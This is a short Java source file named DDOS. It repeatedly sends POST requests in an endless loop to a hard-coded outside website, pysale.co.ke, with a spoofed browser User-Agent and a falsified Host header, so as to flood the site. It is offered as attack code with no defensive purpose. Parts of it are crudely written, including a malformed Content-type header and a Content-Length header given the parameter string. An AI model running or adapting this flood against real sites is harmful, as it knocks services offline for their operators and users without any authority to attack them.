package ddos;

import netscape.javascript.JSObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class DDOS {
    public static void main(String[] args) throws IOException {
        DDOSThread ddosThread=new DDOSThread();

     for (;;){
         ddosThread.attack();
        }
    }
    public static class DDOSThread extends Thread{
        private AtomicBoolean running=new AtomicBoolean(true);
        String link="http://pysale.co.ke";
        String param=null;
        URL url=null;
        public DDOSThread() throws MalformedURLException, UnsupportedEncodingException {
            url=new URL(link);
            param="param1="+ URLEncoder.encode("87845","UTF8");

        }
        public void run(){
            while (running.get()){
                try {
                   attack();
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        }

        public void attack() throws IOException {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset","utf-8");
            connection.setRequestProperty("Host","Localhost");
            connection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0)Gecko/20100101 Firefox/8.0)");
            connection.setRequestProperty("Content-type","Application/-www-form-urlencoded");
            connection.setRequestProperty("Content-Length",param);
            System.out.println(connection.getInputStream());
        }

    }

}
